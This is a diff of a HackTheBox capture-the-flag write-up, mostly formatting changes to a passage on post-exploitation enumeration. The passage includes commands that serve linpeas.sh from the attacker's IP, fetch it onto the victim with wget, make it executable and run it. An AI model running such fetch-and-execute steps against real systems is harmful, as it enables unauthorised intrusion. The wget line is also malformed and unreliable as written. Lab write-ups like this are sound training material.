@@ -58,7 +58,7 @@ I look around a bit and cd /home directory and do a ls and see what's there. Not
 
 Next, let's head over to the tmp directory and try to transfer over some enumeration files like linpeas.sh \
 I go to my attacking machine on my transfers directory where I store all my enumeration files, scripts, images, anything that can be used to help us get an edge on the victim machine. \
-I use python3 -m http.server 80 get the server up and running.
-On the victim machine ill be in the /tmp directory and use wget://10.10.14.10/linpeas.sh which is my attacking machines ip from HackTheBox.
-The file gets transferred over no problem. I use the chmod +x linpeas.sh making it an executable file.
-I use ./linpeas.sh and it kicks off no problem. We get back a lot of results. Several vulnerabilities, but one in particular catches my eye with the yellow red highlight.![image](https://user-images.githubusercontent.com/110210595/185814194-a10cc4a4-932d-4d04-a91c-a5b4f4ae5cdf.png)
+I use python3 -m http.server 80 get the server up and running. \
+On the victim machine ill be in the /tmp directory and use wget://10.10.14.10/linpeas.sh which is my attacking machines ip from HackTheBox. \
+The file gets transferred over no problem. I use the chmod +x linpeas.sh making it an executable file. \
+I use ./linpeas.sh and it kicks off no problem. We get back a lot of results. Several vulnerabilities, but one in particular catches my eye with the yellow red highlight.
